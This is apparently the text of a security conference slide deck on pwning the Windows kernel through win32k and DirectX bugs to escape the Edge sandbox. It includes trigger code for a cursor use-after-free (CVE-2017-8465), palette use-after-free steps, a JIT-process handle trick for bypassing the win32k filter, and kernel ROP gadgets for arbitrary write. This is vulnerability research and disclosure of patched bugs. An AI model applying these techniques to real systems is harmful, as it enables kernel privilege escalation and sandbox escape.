Over the Edge Pwning the windows kernel
Rancho Han Tencent Security ZhanluLab

About me 2
· Sandbox Escape · Kernel Exploit · Vulnerability Discovery · Security Researcher of Tencent ZhanluLab · Twitter: @RanchoIce

About ZhanluLab 3
· Director is yuange, most famous researcher in China · A member of Tencent Security Joint Lab · Pwn2own2017 winner , as Tencent Security Lance Team · We are hiring, base BeiJing · Twitter: @ZhanluLab

Agenda 4
· Win32k analysis · Fuzz strategy · Break out sandbox · Demo Time

Win32k Object 5

· User object

win32kbase!gSharedInfo

typedef struct _HANDLEENTRY {

PVOID pKernel;

PVOID pOwner;

BYTE

bType;

BYTE

bFlags;

WORD

wUniq;

};

// object's kernel address // pointer to object's owner // user object type
// uniqueness count

PVOID HMAllocObject( PVOID ptiOwner, PVOID pDesk, BYTE bType, DWORD size
);

User Object 6

Win32k Object 7

· Gdi object
win32kbase!gpentHmgr
typedef struct _GDITableCell { PVOID pKernel; USHORT nProcess; USHORT nCount; USHORT nUpper; USHORT nType; PVOID pUser;
};
PVOID AllocateObject( ULONG allocSize, ULONG objType, BOOL bZero
);

// object's kernel address // object's owner pid
// gdi object type

Gdi Object 8

Win32k Object 9

· Types of user object & gdi object

User Object

Gdi Object

Window = 1, Menu = 2, Cursor = 3, WindowPos = 4, WindowsHook = 5, MemHandle = 6, CallProcData = 7, AccelTable = 8, DDE Access = 9, DDE Conversation = 0xA, DDE Transaction = 0xB, Monitor = 0xC, KeyboardLayout = 0xD, KeyboardLayoutFile = 0xE, EventHook = 0xF, Timer = 0x10, HidData = 0x12, InputContext = 0x11, TouchInfo = 0x14, GestureInfo = 0x15, MinuserWindow = 0x17

DC = 1, Region = 4, Bitmap = 5, ClientObj = 0x6, Path = 7, Palette = 8, ColorSpace = 9, hFont = 0xA, RFont = 0xB, ColorTransfom = 0xE, SpriteObj = 0xF, Brush =0x10, LogicSurface = 0x12, Space = 0x13, ServerMetaFile = 0x15, DriverObj = 0x1C

How to fuzz?

Fuzz the relationship between objects 11 Relationship Target Object Operation

Position

Window WndPos

Parent & Child

Window DComposition

Link

Cursor

SetInternalWndPos SetForegroundWindow SetWindowPos DeferWindowPos SetWindowPlacement
SetParent SetWindowLongPtr(GWLP_HWNDPARENT) NtDCompositionRemoveVisualChild NtDCompositionReplaceVisualChildren
NtUserLinkDpiCursor

Selete

DC Region Bitmap Palette

SelectObject GetStockObject SelectPalette

Previous work in this area 12
· 33 bugs in 2016, and 35 bugs in 2017

Digging more in-depth

Hidden Syscall 14
· NtUserfn* disappeared from the syscall table
· Thanks to http://j00ru.vexillium.org/syscalls/win32k/32/

Hidden Syscall 15

NtUserMessageCall->gapfnMessageCall

LRESULT NtUserMessageCall( IN HWND hwnd, IN UINT msg, IN WPARAM wParam, IN LPARAM lParam, IN ULONG_PTR xParam, IN DWORD xpfnProc, IN BOOL bAnsi);

Hidden Functions 16

NtUserCall*->apfnSimpleCall

ULONG_PTR NtUserCallOneParam( IN ULONG_PTR dwParam, IN DWORD xpfnProc);
ULONG_PTR NtUserCallHwndParam( IN HWND hwnd, IN ULONG_PTR dwParam, IN DWORD xpfnProc);
...

Usermode callback 17
· So many years past, Microsoft has patched many times for it. Can we sill get something from this mechanism?

CVE-2014-4113 CVE-2015-0057 CVE-2015-1701 CVE-2015-2360 CVE-2015-2363 CVE-2015-2546 CVE-2016-0167 CVE-2017-0263

xxxMNFindWindowFromPoint xxxEnableScrollBar xxxCreateWindowEx xxxRecreateSmallIcons tagCLS UAF tagPOPUPMENU UAF xxxMNDestroyHandler xxxMNEndMenuState

Usermode callback 18
KeUserModeCallback from win32k

Fuzz callback 19
· Hook KernelCallbackTable
1: kd> dt 006c2000 _PEB -y KernelCallbackTable nt_7ff65e5d0000!_PEB
+0x058 KernelCallbackTable : 0x00007ffb`f2f31000 Void
1: kd> dqs 0x00007ffb`f2f31000 l30 00007ffb`f2f31000 00007ffb`f2ec3a30 user32!_fnCOPYDATA 00007ffb`f2f31008 00007ffb`f2f2ab10 user32!_fnCOPYGLOBALDATA 00007ffb`f2f31010 00007ffb`f2ed1330 user32!_fnDWORD 00007ffb`f2f31018 00007ffb`f2ed4690 user32!_fnNCDESTROY 00007ffb`f2f31020 00007ffb`f2ed3de0 user32!_fnDWORDOPTINLPMSG 00007ffb`f2f31028 00007ffb`f2f2b0d0 user32!_fnINOUTDRAG 00007ffb`f2f31030 00007ffb`f2ed5010 user32!_fnGETTEXTLENGTHS 00007ffb`f2f31038 00007ffb`f2f2ae50 user32!_fnINCNTOUTSTRING 00007ffb`f2f31040 00007ffb`f2f2af00 user32!_fnINCNTOUTSTRINGNULL 00007ffb`f2f31048 00007ffb`f2f2afa0 user32!_fnINLPCOMPAREITEMSTRUCT

Breaking the sandbox

Win32k filter 22
· Filtered or not, by this table

Three ways over the Edge 23
· Win32k bug avaliable out of filter list · Bypass win32k filter via chakra JIT process · Exploit a Direct X vulnerability

CVE-2017-8465 24

· https://github.com/progmboy/kernel_vul_poc/blob/master/wi ndows/cursor_poc/poc.cxx

//_CreateEmptyCursorObject

hCur1 = (HCURSOR)NtUserCallOneParam(0, 0x2d);

hCur2 = (HCURSOR)NtUserCallOneParam(0, 0x2d);

CurData[0x6] = 0x1000;

CurData[0x8] = 1;

CurData[0x15] = 1;

CurData[0x16] = 1;

NtUserSetCursorIconData(hCur2, &pstrModName, &pstrModName, CurData);

NtUserLinkDpiCursor(hCur1, hCur2, 0x20);

NtUserSetCursorIconData(hCur2, &pstrModName, &pstrModName, CurData)

NtUserDestroyCursor(hCur2, 1);

NtUserDestroyCursor(hCur1, 1);

// Trigger!

CVE-2017-8465 25
A very good bug discovered by Yinliang of Tencent PCMgr.
All the functions for triggering are not filtered
The specific flaw exists within the win32kfull!LinkCursor function. Due to the lack of proper check between two linked cursors, a use-after-free could be triggered after a series operations.

Step
//Create two cursors and link them hCur1 = (HCURSOR)CreateEmptyCursorObject(); hCur2 = (HCURSOR)CreateEmptyCursorObject();
NtUserLinkDpiCursor(hCurC, hCurD, 0x80);

Step 2
//Reset cur2->DpiHead to itself NtUserSetCursorIconData(hCur2, &pstrModName, &pstrModName, CurData);

Cur1
Next Head

Cur2
Next Head

NULL

Cur1
Next Head

Cur2
Next Head

NULL

Step 3
DestroyCursor(hCur2);

Cur1
Next Head

Freed Cur2

Step 4
The we destroy Cur1, we are going to destroy the Cur1->Next list. So we have a UAF bug: _DestroyCursor(Cur1->Next); //UAF!

CVE-2017-8465 28
· Exploitation Steps
1. Link two cursors and then destroy cur2. 2. Allocate AcceleratorTable objects. 3. Trigger the vulnerability, get AAW. 4. Abusing palette primitives for full read/write.

CVE-2017-8465 29
· It has been patched on June 2017
The Microsoft delete CreateEmpryCursor from apfnSimpleCall table, and no LinkCursor now.

Bypass win32k filter 30
· Flags3.EnableFilteredWin32kAPIs
· From WIP 15048, Edge enabled OOP JIT Server

Bypass win32k filter 31

· We noticed that the jit process is unfiltered!

dt ffff930e7e0657c0 _EPROCESS

+0x000 Pcb

: _KPROCESS

//...

+0x6cc Flags3

: 0x481c820

+0x6cc Minimal

: 0y0

+0x6cc ReplacingPageRoot : 0y0

+0x6cc DisableNonSystemFonts : 0y0

+0x6cc AuditNonSystemFontLoading : 0y0

//...

+0x6cc ProhibitRemoteImageMap : 0y1

+0x6cc ProhibitLowILImageMap : 0y0

+0x6cc SignatureMitigationOptIn : 0y0

+0x6cc DisableDynamicCodeAllowOptOut : 0y1

+0x6cc EnableFilteredWin32kAPIs : 0y0

+0x6cc AuditFilteredWin32kAPIs : 0y1B

Bypass win32k filter 32
· And we noticed that the Edge content process owns a handle
· When I observe the content process's handle info
What's this?

Bypass win32k filter 33
· It's used for RPC with the JIT server
· Abusing it , we can duplicate the handle of JIT process!

Bypass win32k filter 34
· Inject the JIT server from content process
· Now we can exploit win32k bug unlimited!

CVE-2017-8580 35
A good case about public-owned object.

CVE-2017-8580 36 The specific flaw exists within the win32kfull!EngDeletePalette
pPal->ShareCnt++
It means we can delete a palette with nozero share count!

CVE-2017-8580 37

// First, create a palette HPALETTE hPalette = CreateDIBPalette();

cShareCount

0: kd> dq fffff6d9`442482a0 fffff6d9`442482a0 00000000`5e0808c8 80000000`00000000 fffff6d9`442482b0 ffffd10a`ffbc1700 00000010`00000501 fffff6d9`442482c0 ff76b9ed`0000eb45 00000000`00000000
// Then, select it to a DC SelectPalette(hdc, hPalette, TRUE);

typedef struct _BASEOBJECT {
PVOID hHmgr; ULONG cShareCount; USHORT cExclusiveLock; USHORT BaseFlags; PVOID Tid; } BASEOBJECT, *POBJ;

0: kd> dq fffff6d9`442482a0 fffff6d9`442482a0 00000000`5e0808c8 80000000`00000000 fffff6d9`442482b0 ffffd10a`ffbc1700 00000010`00000501 fffff6d9`442482c0 ff76b9ed`0000eb45 00000000`19010689

still zero

hdc

CVE-2017-8580 38
// Call the CreateDIBSection function and pass the hdc as argument, we would // get a DIB surface which referenced a public-owned palette;
hBmp = CreateDIBSection(hdc, pBmpInfo, DIB_PAL_COLORS, &pBmpData, NULL, 0);
0: kd> dq fffff6d9`4455fb70 fffff6d9`4455fb70 ffffffff`c80807e9 00000000`00000001 fffff6d9`4455fb80 ffffd10a`ffbc1700 00000100`00008401 fffff6d9`4455fb90 00000000`0001010f 00000000`00000000
public-owned 0: kd> dq poi(win32kbase!gpentHmgr) + 18 * 7e9 fffff6d9`4001bdd8 ffffffff`ffc807e9 0008c808`00000000 fffff6d9`4001bde8 00000000`00000000
We can search this public palette from GdiSharedHandleTable in PEB

CVE-2017-8580 39
· Finally, we can free this palette via EngDeletePalette

DC
pSurf

This is what we get now

Bmp
pPal

Freed Palette

CVE-2017-8580 40
· Exploitation Steps
1. Trigger the vulnerability 2. Allocate servermetafile objects to reclaim memory. 3. Call SetDIBColorTable and get AAW. 4. Abuse palettes primitives to gain full read and write.

Patch 41
· Palette UAF patched on July 2017
Microsoft just fix the cShareCount passed from EngDeletePalette
· Duplicate handle patched on Sep 2017
Collided by Ivan Fratric! -_-# Edge content processes do not have DUP_HANDLE permission of jit process, and the jit server enabled win32k filter after a month.

Win32k Death? 42

Direct X Subsystem 43
· Many of them are not filtered
0: kd> x win32kbase!*GdiDdDDI* fffffe8a`9849e6a0 win32kbase!NtGdiDdDDIWaitForVerticalBlankEvent2 (<no parameter info>) fffffe8a`9849e3b0 win32kbase!NtGdiDdDDISetHwProtectionTeardownRecovery (<no parameter info>) fffffe8a`98438910 win32kbase!NtGdiDdDDIConfigureSharedResource (<no parameter info>) fffffe8a`98428b10 win32kbase!NtGdiDdDDIPresent (<no parameter info>) fffffe8a`98436fb0 win32kbase!NtGdiDdDDILock (<no parameter info>) fffffe8a`9849dd90 win32kbase!NtGdiDdDDIOpenSynchronizationObject (<no parameter info>) fffffe8a`9842b5e0 win32kbase!NtGdiDdDDILock2 (<no parameter info>) fffffe8a`9843d9c0 win32kbase!NtGdiDdDDIEvict (<no parameter info>) fffffe8a`9849dae0 win32kbase!NtGdiDdDDIGetSetSwapChainMetadata (<no parameter info>) fffffe8a`9849d990 win32kbase!NtGdiDdDDIGetContextInProcessSchedulingPriority (<no parameter info>) fffffe8a`9849dbe0 win32kbase!NtGdiDdDDINetDispQueryMiracastDisplayDeviceStatus (<no parameter info>) fffffe8a`9842b870 win32kbase!NtGdiDdDDIReclaimAllocations2 (<no parameter info>)

CVE-2018-0977 44
· Attack the Direct X subsystem
Controlled pointer

CVE-2018-0977 45

user controllable

0: kd> u BasicRender!WARPKMDMABUFINFO::Run+60

BasicRender!WARPKMDMABUFINFO::Run+0x60:

fffff809`753a539c 488b07

mov

rax,qword ptr [rdi]

fffff809`753a539f 7548

jne

BasicRender!WARPKMDMABUFINFO::Run+0xad

(fffff809`753a53e9)

fffff809`753a53a1 488b00

mov

rax,qword ptr [rax]

fffff809`753a53a4 488d542430

lea

rdx,[rsp+30h]

fffff809`753a53a9 ff15814e0000 call qword ptr [BasicRender!_guard_dispatch_icall_fptr

(fffff809`753aa230)]

0: kd> dqs fffff809`753aa230 fffff809`753aa230 fffff809`753a6550 BasicRender!guard_dispatch_icall_nop fffff809`753aa238 00000000`0000a288

0: kd> uf BasicRender!guard_dispatch_icall_nop

BasicRender!guard_dispatch_icall_nop:

fffff809`753a6550 ffe0

jmp

rax

Nothing!

CVE-2018-0977 46

· Crash occurred in system process, no user space, no win32k

PROCESS_NAME: System

CURRENT_IRQL: 0 ...

1: kd> k

# Child-SP

RetAddr

Call Site

00 ffff8b08`0ed94c80 fffff809`753a56b2 BasicRender!WARPKMDMABUFINFO::Run+0x60

01 ffff8b08`0ed94cb0 fffff809`753a51b3 BasicRender!WARPKMGPUNODE::Run+0xa6

02 ffff8b08`0ed94d10 fffff809`753a4845 BasicRender!WARPKMADAPTER::RunGPU+0x7c3

03 ffff8b08`0ed95be0 fffff801`278f53a7 BasicRender!WARPKMADAPTER::WarpGPUWorkerThread+0x25

04 ffff8b08`0ed95c10 fffff801`2797ad66 nt!PspSystemThreadStartup+0x47

05 ffff8b08`0ed95c60 00000000`00000000 nt!KiStartSystemThread+0x16

· How to layout data for ROP?

CVE-2018-0977 47
· Spray data with NamedPipe object
· Need a kernel info leak to get nt base and kernel data address - First, we need nt base to calculate ROP gadgets address - Then, we should control RSP register point to the ROP data
We need a good info leak, and used it twice. Fortunately I have disovered one, but it's still unpatched, so I won't
disclose it in this speech.

CVE-2018-0977 48

· Rop in kernel, turn to AAW
KseGetIoCallbacks:

mov mov retn

rax, [rcx+30h] // rcx point to pipe name rax, [rax+38h] // control rax

nt!KiResetForceIdle+0xf7:

pop

rcx

retn

xHalQueryProcessorRestartEntryPoint + 0x2:

mov

[rcx], rax

mov ax, 0C00000BBh

retn

// Write!

Demo Time

Patch 50
· Patched in March 2018 · And Microsoft made a mistake
Collisions once again! -_-#

Acknowledgements 51
· Yuange of Tencent ZhanluLab · ChenNan of Tencent ZhanluLab · YinLiang of Tencent PCMgr · Henry Li of Tencent ZhanluLab

Reference 52 · https://github.com/progmboy/kernel_vul_poc/blob/master/windows/cursor_poc/poc.cxx · https://www.zerodayinitiative.com/advisories/ZDI-17-474/ · https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0977 · https://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_Slides.pdf

Question 53

54
Thanks

